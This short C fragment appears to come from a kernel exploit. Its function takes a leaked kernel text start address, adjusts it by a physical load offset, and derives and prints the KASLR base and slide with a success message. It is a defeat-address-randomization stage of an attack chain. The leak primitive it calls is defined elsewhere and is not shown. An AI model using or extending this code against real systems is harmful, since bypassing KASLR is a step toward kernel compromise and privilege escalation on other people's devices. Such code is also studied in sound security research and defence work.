#include "common.h"

int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
int slide_leak_kernel_base(void) {

  uint64_t stext = getkerneltextstart();
  stext += (P0_KERNEL_PHYS_LOAD & ((2ULL << 20) - 1));
  kaslr_base = stext;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_success("KASLR base=%016llx slide=%016llx\n",
              (unsigned long long)kaslr_base,
              (unsigned long long)kaslr_slide);
  return 1;
}
